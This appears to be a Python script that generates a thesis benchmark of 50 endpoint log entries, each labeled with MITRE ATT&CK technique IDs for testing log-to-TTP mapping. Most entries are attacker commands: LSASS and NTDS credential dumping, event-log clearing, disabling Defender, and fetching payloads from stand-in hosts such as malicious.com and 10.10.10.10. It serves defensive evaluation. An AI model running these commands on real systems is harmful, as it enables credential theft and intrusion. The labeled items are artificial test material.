import json

# 論文專用：50 筆高保真複雜度測試集 (包含真實攻擊、混淆、LotL 與正常雜訊)
COMPLEX_LOGS = [
    # --- [類別 A: Credential Access (憑證存取)] ---
    {"log": {"EventID": "1", "CommandLine": "procdump.exe -ma lsass.exe C:\\Temp\\lsass.dmp", "Image": "C:\\Tools\\procdump.exe"}, "ttps": ["T1003.001", "T1003"]},
    {"log": {"EventID": "1", "CommandLine": "rundll32.exe C:\\windows\\System32\\comsvcs.dll, MiniDump 624 C:\\temp\\lsass.dmp full", "Image": "C:\\Windows\\System32\\rundll32.exe"}, "ttps": ["T1003.001", "T1003"]},
    {"log": {"EventID": "1", "CommandLine": "reg save HKLM\\SAM C:\\Temp\\sam.save", "Image": "C:\\Windows\\System32\\reg.exe"}, "ttps": ["T1003.002", "T1003"]},
    {"log": {"EventID": "1", "CommandLine": "reg save HKLM\\SYSTEM C:\\Temp\\system.save", "Image": "C:\\Windows\\System32\\reg.exe"}, "ttps": ["T1003.002", "T1003"]},
    {"log": {"EventID": "1", "CommandLine": "ntdsutil \"ac i ntds\" \"ifm\" \"create full c:\\temp\" q q", "Image": "C:\\Windows\\System32\\ntdsutil.exe"}, "ttps": ["T1003.003", "T1003"]},
    {"log": {"EventID": "10", "SourceImage": "C:\\Windows\\System32\\taskmgr.exe", "TargetImage": "C:\\Windows\\system32\\lsass.exe", "GrantedAccess": "0x1F0FFF"}, "ttps": ["T1003.001", "T1003"]},
    {"log": {"EventID": "1", "CommandLine": "esentutl.exe /y /vss C:\\windows\\ntds\\ntds.dit /d c:\\temp\\ntds.dit", "Image": "C:\\Windows\\System32\\esentutl.exe"}, "ttps": ["T1003.003", "T1003"]},
    {"log": {"EventID": "1", "CommandLine": "vssadmin create shadow /for=C:", "Image": "C:\\Windows\\System32\\vssadmin.exe"}, "ttps": ["T1003.003", "T1003"]},
    {"log": {"EventID": "1", "CommandLine": "cmd.exe /c copy \\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy1\\Windows\\NTDS\\NTDS.dit C:\\temp\\ntds.dit", "Image": "C:\\Windows\\System32\\cmd.exe"}, "ttps": ["T1003.003", "T1003"]},
    {"log": {"EventID": "1", "CommandLine": "LaZagne.exe all", "Image": "C:\\Temp\\LaZagne.exe"}, "ttps": ["T1555", "T1003"]},

    # --- [類別 B: Defense Evasion (防禦規避)] ---
    {"log": {"EventID": "1", "CommandLine": "wevtutil cl System", "Image": "C:\\Windows\\System32\\wevtutil.exe"}, "ttps": ["T1070.001", "T1070"]},
    {"log": {"EventID": "1", "CommandLine": "wevtutil clear-log Security", "Image": "C:\\Windows\\System32\\wevtutil.exe"}, "ttps": ["T1070.001", "T1070"]},
    {"log": {"EventID": "1", "CommandLine": "powershell.exe Clear-EventLog -LogName Security", "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"}, "ttps": ["T1070.001", "T1070"]},
    {"log": {"EventID": "1", "CommandLine": "reg add \"HKLM\\Software\\Policies\\Microsoft\\Windows Defender\" /v DisableAntiSpyware /t REG_DWORD /d 1 /f", "Image": "C:\\Windows\\System32\\reg.exe"}, "ttps": ["T1562.001", "T1562"]},
    {"log": {"EventID": "1", "CommandLine": "powershell.exe Set-MpPreference -DisableRealtimeMonitoring $true", "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"}, "ttps": ["T1562.001", "T1562"]},
    {"log": {"EventID": "1", "CommandLine": "mshta.exe javascript:a=GetObject(\"script:https://malicious.com/payload.sct\").Exec();close();", "Image": "C:\\Windows\\System32\\mshta.exe"}, "ttps": ["T1218.005", "T1218"]},
    {"log": {"EventID": "1", "CommandLine": "regsvr32.exe /s /n /u /i:http://malicious.com/payload.sct scrobj.dll", "Image": "C:\\Windows\\System32\\regsvr32.exe"}, "ttps": ["T1218.010", "T1218"]},
    {"log": {"EventID": "1", "CommandLine": "certutil.exe -decode C:\\Temp\\encoded.txt C:\\Temp\\decoded.exe", "Image": "C:\\Windows\\System32\\certutil.exe"}, "ttps": ["T1140", "T1027"]},
    {"log": {"EventID": "1", "CommandLine": "attrib.exe +h C:\\Temp\\malware.exe", "Image": "C:\\Windows\\System32\\attrib.exe"}, "ttps": ["T1564.001", "T1564"]},
    {"log": {"EventID": "11", "TargetFilename": "C:\\Windows\\System32\\Tasks\\UpdateTask", "Image": "C:\\Windows\\System32\\cmd.exe"}, "ttps": ["T1070.004", "T1070"]},

    # --- [類別 C: Execution & Command and Control (執行與 C2)] ---
    {"log": {"EventID": "1", "CommandLine": "powershell.exe -nop -w hidden -EncodedCommand JABzAD0ATgBlAHcALQBPAGIAagBlAGMAdAAgAEkATwAuAE0AZQBtAG8AcgB5AFMAdAByAGUAYQBtACgAWwBDAG8AbgB2AGUAcgB0AF0AOgA6AEYAcgBvAG0AQgBhAHMAZQA2ADQAUwB0AHIAaQBuAGcAKAAiAEgA...", "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"}, "ttps": ["T1059.001", "T1027"]},
    {"log": {"EventID": "1", "CommandLine": "cmd.exe /c \"echo IEX(New-Object Net.WebClient).DownloadString('http://10.10.10.10/payload.ps1') | powershell -noprofile -\"", "Image": "C:\\Windows\\System32\\cmd.exe"}, "ttps": ["T1059.001", "T1105"]},
    {"log": {"EventID": "1", "CommandLine": "wmic.exe process call create \"cmd.exe /c calc.exe\"", "Image": "C:\\Windows\\System32\\wbem\\wmic.exe"}, "ttps": ["T1047"]},
    {"log": {"EventID": "1", "CommandLine": "certutil.exe -urlcache -split -f http://malicious.com/nc.exe C:\\temp\\nc.exe", "Image": "C:\\Windows\\System32\\certutil.exe"}, "ttps": ["T1105"]},
    {"log": {"EventID": "1", "CommandLine": "bitsadmin.exe /transfer myjob /download /priority normal http://malicious.com/payload.exe C:\\temp\\payload.exe", "Image": "C:\\Windows\\System32\\bitsadmin.exe"}, "ttps": ["T1197", "T1105"]},
    {"log": {"EventID": "1", "CommandLine": "curl.exe http://malicious.com/payload.exe -o C:\\temp\\payload.exe", "Image": "C:\\Windows\\System32\\curl.exe"}, "ttps": ["T1105"]},
    {"log": {"EventID": "1", "CommandLine": "powershell.exe Invoke-WebRequest -Uri http://malicious.com/payload.exe -OutFile C:\\temp\\payload.exe", "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"}, "ttps": ["T1105"]},
    {"log": {"EventID": "1", "CommandLine": "wmic.exe /node:192.168.1.50 process call create \"C:\\temp\\payload.exe\"", "Image": "C:\\Windows\\System32\\wbem\\wmic.exe"}, "ttps": ["T1047", "T1569.002"]},
    {"log": {"EventID": "1", "CommandLine": "psexec.exe \\\\192.168.1.50 -u admin -p password -s cmd.exe", "Image": "C:\\Temp\\psexec.exe"}, "ttps": ["T1569.002"]},
    {"log": {"EventID": "1", "CommandLine": "msbuild.exe C:\\Temp\\malicious.csproj", "Image": "C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\msbuild.exe"}, "ttps": ["T1127.001", "T1127"]},

    # --- [類別 D: Persistence & Discovery (持久化與探測)] ---
    {"log": {"EventID": "1", "CommandLine": "schtasks /create /tn \"Updater\" /tr \"C:\\Temp\\payload.exe\" /sc onlogon /ru System", "Image": "C:\\Windows\\System32\\schtasks.exe"}, "ttps": ["T1053.005", "T1053"]},
    {"log": {"EventID": "1", "CommandLine": "reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v \"Update\" /t REG_SZ /d \"C:\\temp\\payload.exe\" /f", "Image": "C:\\Windows\\System32\\reg.exe"}, "ttps": ["T1547.001", "T1547"]},
    {"log": {"EventID": "11", "TargetFilename": "C:\\Users\\admin\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\payload.exe", "Image": "C:\\Windows\\System32\\cmd.exe"}, "ttps": ["T1547.001", "T1547"]},
    {"log": {"EventID": "1", "CommandLine": "sc.exe create \"MaliciousService\" binpath= \"C:\\temp\\payload.exe\" start= auto", "Image": "C:\\Windows\\System32\\sc.exe"}, "ttps": ["T1543.003", "T1543"]},
    {"log": {"EventID": "1", "CommandLine": "net user /domain", "Image": "C:\\Windows\\System32\\net.exe"}, "ttps": ["T1087.002", "T1087"]},
    {"log": {"EventID": "1", "CommandLine": "net group \"Domain Admins\" /domain", "Image": "C:\\Windows\\System32\\net.exe"}, "ttps": ["T1069.002", "T1069"]},
    {"log": {"EventID": "1", "CommandLine": "whoami /groups", "Image": "C:\\Windows\\System32\\whoami.exe"}, "ttps": ["T1033"]},
    {"log": {"EventID": "1", "CommandLine": "nltest.exe /domain_trusts", "Image": "C:\\Windows\\System32\\nltest.exe"}, "ttps": ["T1482"]},
    {"log": {"EventID": "1", "CommandLine": "arp.exe -a", "Image": "C:\\Windows\\System32\\arp.exe"}, "ttps": ["T1016"]},
    {"log": {"EventID": "1", "CommandLine": "ipconfig.exe /all", "Image": "C:\\Windows\\System32\\ipconfig.exe"}, "ttps": ["T1016"]},

    # --- [類別 E: Benign System Noise & Normal Admin Tasks (純淨雜訊與合法網管操作)] ---
    {"log": {"EventID": "1", "CommandLine": "\"C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe\" --type=renderer --field-trial-handle=...", "Image": "C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe"}, "ttps": ["Unknown Threat"]},
    {"log": {"EventID": "1", "CommandLine": "C:\\Windows\\System32\\svchost.exe -k LocalServiceNetworkRestricted -p", "Image": "C:\\Windows\\System32\\svchost.exe"}, "ttps": ["Unknown Threat"]},
    {"log": {"EventID": "1", "CommandLine": "\"C:\\Windows\\System32\\backgroundTaskHost.exe\" -ServerName:CortanaUI.AppXy7vb4pc2qe35fs4vyzf5jxi...", "Image": "C:\\Windows\\System32\\backgroundTaskHost.exe"}, "ttps": ["Unknown Threat"]},
    {"log": {"EventID": "1", "CommandLine": "C:\\Windows\\system32\\wuauclt.exe /ReportNow", "Image": "C:\\Windows\\System32\\wuauclt.exe"}, "ttps": ["Unknown Threat"]},
    {"log": {"EventID": "1", "CommandLine": "C:\\Windows\\system32\\MpCmdRun.exe -SignatureUpdate", "Image": "C:\\Windows\\System32\\MpCmdRun.exe"}, "ttps": ["Unknown Threat"]},
    {"log": {"EventID": "1", "CommandLine": "C:\\Program Files\\Microsoft Visual Studio\\2022\\Community\\Common7\\IDE\\devenv.exe", "Image": "C:\\Program Files\\Microsoft Visual Studio\\2022\\Community\\Common7\\IDE\\devenv.exe"}, "ttps": ["Unknown Threat"]},
    {"log": {"EventID": "1", "CommandLine": "git.exe fetch origin", "Image": "C:\\Program Files\\Git\\cmd\\git.exe"}, "ttps": ["Unknown Threat"]},
    {"log": {"EventID": "1", "CommandLine": "C:\\Windows\\Explorer.EXE /factory,{75dff2b7-6936-4c06-a8bb-676a7b00b24b} -Embedding", "Image": "C:\\Windows\\Explorer.EXE"}, "ttps": ["Unknown Threat"]},
    {"log": {"EventID": "1", "CommandLine": "powershell.exe -Command Get-Process", "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"}, "ttps": ["Unknown Threat"]},
    {"log": {"EventID": "1", "CommandLine": "ping.exe 8.8.8.8", "Image": "C:\\Windows\\System32\\ping.exe"}, "ttps": ["Unknown Threat"]}
]

OUTPUT_FILE = "complex_apt_dataset_50.jsonl"
SOURCE_NAME = "thesis_hardcore_eval_v1"

print(f"⏳ 正在為論文生成高難度基準測試集 (目標: 50 筆)...")

with open(OUTPUT_FILE, 'w', encoding='utf-8') as out_f:
    for entry in COMPLEX_LOGS:
        log_str = json.dumps(entry["log"], ensure_ascii=False)
        valid_ttps = entry["ttps"]
        
        prompt_text = f"""Below is an instruction that describes a task, paired with an input that provides further context. Write a response that appropriately completes the request.
### Instruction:
Analyze the endpoint log, extract malicious features, and map to MITRE ATT&CK. You MUST output strictly in JSON containing 'TTP_ID' and 'Explanation'.
### Input:
{log_str}
### Response:
{{"TTP_ID": "TXXXX", "Explanation": "Pending Human Labeling"}}"""

        jsonl_obj = {
            "text": prompt_text,
            "valid_ttps": valid_ttps,
            "source_file": SOURCE_NAME
        }
        out_f.write(json.dumps(jsonl_obj, ensure_ascii=False) + "\n")

print(f"✅ 生成完畢！檔案已儲存為：{OUTPUT_FILE}")
print("💡 請在 benchmark_with_judge.py 中將 DATASET_FILE 修改為此檔案名稱，並重新執行測試。")